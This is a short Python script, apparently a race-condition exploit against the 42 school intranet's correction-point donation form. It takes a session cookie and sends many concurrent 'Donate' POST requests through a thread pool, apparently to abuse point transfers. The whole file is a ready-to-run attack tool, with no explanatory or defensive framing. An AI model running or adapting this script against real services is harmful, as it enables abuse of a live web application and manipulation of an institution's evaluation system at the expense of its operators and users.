import requests
from concurrent.futures import ThreadPoolExecutor
import sys

if len(sys.argv) != 4:
    print("Usage: python3 Donation_P42.py <END_POINT> <HOW_MANY_POINTS> <SESSION_ID>")
    sys.exit(1)

END_POINT = sys.argv[1]
much = int(sys.argv[2])
SESSION_ID = sys.argv[3]

url = END_POINT

data = {
    'correction_point': '1',
    'commit': 'Donate'
}

headers = {
    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
    "Content-Type": "application/x-www-form-urlencoded",
}

cookies = {
    "_intra_42_session_production": SESSION_ID,
}

def send_post():
    response = requests.post(url, data=data, headers=headers, cookies=cookies)
    print(f"status : {response.status_code}")

with ThreadPoolExecutor(max_workers=much) as executor:
    futures = [executor.submit(send_post) for _ in range(much)]
